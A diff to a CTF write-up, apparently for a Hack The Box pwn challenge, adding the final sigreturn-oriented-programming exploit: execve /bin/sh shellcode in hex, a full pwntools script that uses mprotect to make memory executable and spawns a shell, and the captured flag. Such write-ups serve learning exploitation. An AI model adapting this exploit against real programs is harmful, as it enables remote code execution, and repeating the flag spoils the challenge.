@@ -164,13 +164,102 @@ Why need to do .recv() after we sent payloads in SROP??
 
 
 29. We can set our return address to that.
-30. For the shellcode, i used this --> https://shell-storm.org/shellcode/files/shellcode-806.html.
-31. Anyway since the shellcode only has 27 as it's length, we need to add 13 more as it's junk to RIP.
-32. Here's the full script:
+30. For the shellcode, I used this --> https://www.exploit-db.com/exploits/47008
+
+```hex
+\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05
+```
+
+31. Anyway, since the shellcode length is 22, hence we need to add 18 padding to reach RIP.
+32. Here's our final script:
 
 > SCRIPT
 
 ```py
+from pwn import *
+import os
+os.system('clear')
 
+def start(argv=[], *a, **kw):
+    if args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:
+        return process([exe] + argv, *a, **kw)
+
+exe = './sick_rop'
+elf = context.binary = ELF(exe, checksec=True)
+context.log_level = 'INFO'
+
+sh = start()
+# pause()
+rop = ROP(elf)
+syscall = rop.find_gadget(['syscall', 'ret'])[0]
+info(f'SYSCALL GADGET --> {hex(syscall)}')
+
+vuln_pointer = 0x4010d8
+writeable_area = 0x400000
+
+frame = SigreturnFrame() # adding kernel="amd64" as arg is optional
+frame.rax = 0xa #10 --> mprotect
+frame.rdi = writeable_area
+frame.rsi = 0x400000 # set size
+frame.rdx = 0x7 #7 --> initialize rwx access to what's rdi pointing to
+
+# because we're changing the stack frame
+# keep in mind --> calling the vuln function directly, won't get us to that function
+frame.rsp = vuln_pointer 
+frame.rip = syscall
+
+## 1st payload
+p = flat([
+    asm('nop') * 40,
+    elf.sym['vuln'],
+    syscall,
+    bytes(frame)
+])
+
+sh.sendline(p)
+get = sh.recv()
+print('recv 1 -->', get)
+# ## 2nd payload, triggering the sigreturn signal to activate the 1st payload | sys_rt_sigreturn
+
+# junk = b'A' * 15 # if using .send()
+# sh.send(junk)
+
+# 0xf --> 15
+junk = b'A' * 14
+sh.sendline(junk)
+# get = sh.recv()
+# print('recv 2 -->', get)
+
+# ## 3rd payload, RCE moment
+shellcode = (b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05')
+# print(len(shellcode)) # --> 22
+
+padding = asm('nop') * 18
+shell = shellcode + padding + pack(0x4010b8)
+sh.send(shell)
+# get = sh.recv()
+# print('recv 3 -->', get)
+sh.interactive()
 ```
 
+> RESULT LOCAL
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/1199dafe-6d4f-4fe9-be92-186c626b13a7)
+
+
+33. Got RCEEEE, let's send it remotely.
+
+> RESULT REMOTE
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/dec26ca0-479e-4f8e-a777-c9addc2bfffc)
+
+
+34. Got the flag!
+
+## FLAG
+
+```
+HTB{why_st0p_wh3n_y0u_cAn_s1GRoP!?}
+```
